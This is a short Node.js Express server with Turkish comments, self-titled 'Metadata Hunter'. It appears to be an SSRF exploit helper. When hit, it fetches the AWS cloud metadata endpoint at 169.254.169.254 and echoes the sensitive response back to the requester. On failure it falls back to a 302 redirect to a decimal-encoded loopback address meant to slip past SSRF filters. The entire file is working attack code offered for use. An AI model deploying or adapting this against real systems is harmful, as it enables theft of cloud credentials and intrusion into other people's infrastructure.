const express = require('express');
const axios = require('axios'); // Axios modülü gereklidir (npm install axios)
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
    console.log(`\n[${new Date().toISOString()}] İstek Geldi: ${req.method} ${req.url}`);
    console.log('User-Agent:', req.headers['user-agent']);
    next();
});

// Ana domain'e istek geldiğinde 302 yerine doğrudan metadata'yı fetch'le
app.get('/', async (req, res) => {
    // AWS / Cloud Metadata hedefi (veya alternatif ip'ler)
    const metadataTarget = 'http://169.254.169.254/latest/meta-data/';
    
    console.log(`[!] Metadata hedefien sunucu üzerinden istek atılıyor: ${metadataTarget}`);

    try {
        // Sunucu kendi içinden/buluttan hedefe istek atıyor
        const response = await axios.get(metadataTarget, {
            timeout: 4000,
            headers: {
                // Bazı cloud servisleri IMDSv2 için token ister, v1 için bu yeterlidir
                'X-aws-ec2-metadata-token-ttl-seconds': '21600' 
            }
        });

        console.log("🔥 METADATA BAŞARIYLA ÇEKİLDİ! Yanıt:");
        console.log(response.data);

        // Elde edilen hassas veriyi hem terminale basıyoruz hem de isteği atana gösteriyoruz
        return res.status(200).send(`Metadata Data:\n${JSON.stringify(response.data, null, 2)}`);

    } catch (error) {
        console.log(`[-] Metadata isteği başarısız oldu veya bu ortamda metadata yok: ${error.message}`);
        
        // Eğer Render üzerinde çalışıyorsan, Render kapalı bir bulut sunucu olduğu için 
        // burası zaman aşımına (timeout) uğrayabilir veya hata dönebilir. 
        // O yüzden yedek olarak 302 yönlendirmesini patlatabiliriz:
        return res.redirect(302, 'http://2130706433'); 
    }
});

app.listen(3000, () => {
    console.log("🚀 Metadata Avcısı 3000 portunda devrede!");
});
